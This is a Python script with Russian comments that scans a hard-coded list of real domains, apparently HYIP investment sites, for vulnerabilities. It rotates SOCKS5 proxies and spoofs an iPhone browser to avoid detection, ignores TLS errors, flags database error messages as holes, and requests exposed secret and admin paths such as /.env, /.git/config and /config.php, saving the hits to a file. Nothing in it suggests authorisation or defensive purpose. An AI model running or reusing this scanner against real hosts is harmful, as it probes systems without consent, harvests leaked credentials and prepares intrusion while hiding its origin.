#!/usr/bin/env python3
"""Массовый скан HYIP: iPhone-образы + ротация IP. Ошибка=дыра=открыто."""
import sys, json, re, random, requests, urllib3
urllib3.disable_warnings()
import urllib.request

# живые HYIP из топ-20
TARGETS = ["aitimart.cc","marsses.com","cryptoize.net","mooner.pro","elementex.tech",
           "algoid.online","pairbots.net","bitnexus.cc","piarim.biz","rsw-systems.com",
           "footcap.com","globus-inter.com"]

def get_ips(n):
    plist = urllib.request.urlopen("http://127.0.0.1:8912/socks5.txt?limit="+str(n), timeout=8).read().decode().splitlines()
    return [p for p in plist if ":" in p]

IPS = get_ips(15)
print(f"IP из пула: {len(IPS)}", flush=True)

SIGNALS = ["sql syntax","fatal error","stack trace","uncaught","warning:","exception",
           "syntax error","mysql","mariadb","PDOException","SQLSTATE","laravel"]

results = []
for dom in TARGETS:
    BASE = f"https://{dom}"
    found = {"dom": dom, "open": [], "errors": []}
    ip = IPS[len(results) % len(IPS)]
    proxy = {"http": f"socks5h://{ip}", "https": f"socks5h://{ip}"}
    try:
        r = requests.get(BASE+"/", proxies=proxy, headers={"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15"}, verify=False, timeout=12)
        body = r.text
        ml = len(body)
        # ОШИБКИ = ДЫРЫ
        for sig in SIGNALS:
            if sig in body.lower():
                found["errors"].append(sig)
        # открытые дыры-пути
        for p in ["/.env","/core/.env","/admin","/install","/config.php","/.git/config","/phpinfo.php"]:
            try:
                r2 = requests.get(BASE+p, proxies=proxy, headers={"User-Agent":"Mozilla/5.0"}, verify=False, timeout=8)
                b2 = r2.text
                is_leak = '=' in b2[:200] and 'html' not in b2[:100].lower()
                if r2.status_code == 200 and (is_leak or (abs(len(b2)-ml) > 50 and len(b2) < 50000)):
                    found["open"].append({"path": p, "len": len(b2), "leak": is_leak})
            except Exception:
                pass
        status = "🔴 ДЫРЫ" if (found["errors"] or found["open"]) else "чисто"
        print(f"{status} {dom} [{ip}]: ошибки={found['errors']} открыто={len(found['open'])}", flush=True)
        for o in found["open"][:3]:
            print(f"    ✅ {o['path']} ({o['len']}б){' УТЕЧКА' if o['leak'] else ''}", flush=True)
        results.append(found)
    except Exception as e:
        print(f"  {dom}: ERR {type(e).__name__}", flush=True)

json.dump(results, open('/root/office/output/hyip_holes.json','w'), indent=1)
print(f"\nГОТОВО: {len(results)} целей, дырявых: {sum(1 for r in results if r['errors'] or r['open'])}", flush=True)
